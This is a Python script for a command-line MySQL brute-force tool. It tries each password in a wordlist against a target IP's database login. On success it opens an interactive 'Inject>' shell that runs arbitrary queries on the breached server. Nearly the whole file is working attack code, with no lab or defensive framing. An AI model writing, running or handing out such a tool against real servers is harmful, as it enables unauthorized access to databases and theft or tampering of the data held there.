import argparse
import pymysql
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def brute_force_sql(username, password_list, target_ip):
    # Try to connect using each password in the list
    for password in password_list:
        print(f"{Fore.YELLOW}Trying Passphrase: {password}...")
        try:
            connection = pymysql.connect(
                host=target_ip,
                user=username,
                password=password,
                port=3306
            )
            print(f"{Fore.GREEN}KEY FOUND: [ {password} ]")
            return connection
        except pymysql.MySQLError:
            continue
    print(f"{Fore.RED}KEY NOT FOUND")
    return None

def execute_sql_commands(connection):
    print(f"{Fore.CYAN}Inject> ", end="", flush=True)
    while True:
        try:
            query = input(f"{Fore.CYAN}Inject> ")
            if query.strip().lower() == 'exit':
                break
            cursor = connection.cursor()
            cursor.execute(query)
            results = cursor.fetchall()
            for row in results:
                print(row)
            cursor.close()
        except Exception as e:
            print(f"{Fore.RED}Error executing query: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="SQL Brute Forcer")
    parser.add_argument('-l', '--username', required=True, help="Target SQL username")
    parser.add_argument('-P', '--passwordlist', required=True, help="Password list file")
    parser.add_argument('target', help="Target IP (e.g., sql://<target-ip>)")

    args = parser.parse_args()

    # Extract the IP from the argument
    target_ip = args.target.split("://")[1]

    # Read password list from file
    try:
        with open(args.passwordlist, 'r') as f:
            password_list = f.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}Password list file not found!")
        return

    # Attempt to brute force the login
    connection = brute_force_sql(args.username, password_list, target_ip)

    # If connection is successful, start the SQL prompt
    if connection:
        execute_sql_commands(connection)
        connection.close()

if __name__ == "__main__":
    main()
